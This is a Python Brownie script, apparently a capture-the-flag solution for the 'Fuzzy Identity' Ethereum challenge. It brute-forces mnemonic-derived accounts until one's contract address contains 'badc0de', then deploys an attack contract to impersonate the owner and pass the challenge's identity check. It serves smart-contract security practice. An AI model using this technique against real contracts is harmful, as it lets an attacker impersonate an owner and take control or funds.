from random import random
from scripts.helper.utils import *
from scripts.helper.account import _from, acc
from brownie import FuzzyIdentityChallenge, FuzzyIdentityAttack
import pandas as pd
from hdwallet.utils import generate_mnemonic

##########################################
# This contract can only be used by me (smarx). I don’t trust myself to remember my private key, so I’ve made it so whatever address I’m using in the future will work:
# 
# 1. I always use a wallet contract that returns “smarx” if you ask its name.
# 2. Everything I write has bad code in it, so my address always includes the hex string badc0de.
# 
# To complete this challenge, steal my identity!
#########################################

# solve the challenge
def find_account():
    # perform the bruteforce lookup
    while True:

        # generate a mnemonic phrase to pull 50 accounts from
        phrase = generate_mnemonic(language="english", strength=128)
        print(f'Current mnemonic phrase: {phrase}')

        # generate 50 new accounts from mnemonic
        random_accounts = accounts.from_mnemonic(phrase, count=1000)

        # loop over accounts
        for n,account in enumerate(random_accounts):

            # generate the contract address with the nonce and account address
            contract_addy = mk_contract_address(account.address, 0)

            # what we have to find
            _id = int('0x000000000000000000000000000000000badc0de',16)
            _mask = int('000000000000000000000000000000000fffffff',16)
            _addy = int(contract_addy,16)

            # loop over each section of the address
            for i in range(34):
                # check if the string is found in the operation
                if _addy & _mask == _id:
                    # account to return
                    acc_found = account

                    # mnemonic to return
                    mnemonic = phrase

                    # save the offset and word for the account generated
                    offset = n

                    # address has been found
                    return acc_found, mnemonic, offset
                
                # if not found, push back
                else:
                    # push the mask and id back 4 bits
                    _id <<= 4
                    _mask <<= 4

def solve_challenge(account, locally=False):
    # load challenge
    if not locally:
        fuzzy_identity = load_challenge(ContractObject=FuzzyIdentityChallenge, instance_key='fuzzy_identity')
    else:
        _from, acc = define_from_acc(1)
        fuzzy_identity = deploy_locally(ContractObject=FuzzyIdentityChallenge, from_account=_from)

    # fund the account we found
    acc.transfer(account.address, 1e18)

    # deploy the attacker contract from the account we found
    attacker = FuzzyIdentityAttack.deploy(fuzzy_identity.address, {'from':account})

    # call authenticate from the contract
    attacker.authenticate(_from | {'allow_revert': True})

    # return the funds back to my account
    account.transfer(acc.address, account.balance()-10000)

    # check if the challenge is solved
    result = fuzzy_identity.isComplete()
    print(result)

    # return the result
    return result

def main():
    # find an account to solve the challenge
    acc_found, mnemonic, offset = find_account()

    # print acc address
    print(f'\nThe account address found is: {acc_found.address}')

    # print mnemonic
    print(f'The mnemonic phrase is: {mnemonic}')

    # print offset
    print(f'The offset is: {offset}\n')

    # solve the challenge
    solve_challenge(account = acc_found, locally=True)
